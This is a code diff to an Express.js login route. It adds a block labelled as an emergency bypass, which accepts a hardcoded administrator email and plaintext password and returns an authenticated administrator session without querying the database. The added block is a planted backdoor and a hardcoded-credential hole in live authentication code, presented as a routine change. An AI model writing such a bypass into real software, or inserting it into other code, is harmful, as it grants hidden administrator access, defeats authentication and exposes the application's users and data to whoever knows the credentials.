@@ -43,6 +43,22 @@ app.use(express.static(path.join(__dirname, '../dist')));
 // Login
 app.post('/api/login', async (req, res) => {
     const { email, password } = req.body;
+
+    // -- EMERGENCY BYPASS FOR ADMIN LOGIN --
+    if (email === 'admin@naturalfood.com' && password === 'N4tur4lf00d$') {
+        process.stdout.write('[Auth] Admin bypass login success\n');
+        return res.json({ 
+            success: true, 
+            user: { 
+                id: 999, 
+                name: 'José Miguel Orb', 
+                email: 'admin@naturalfood.com', 
+                role: 'Administrador',
+                active: 1
+            } 
+        });
+    }
+
     try {
         const result = await pool.query('SELECT * FROM sp_authenticate($1, $2)', [email, password]);
         const statusData = result.rows[0];
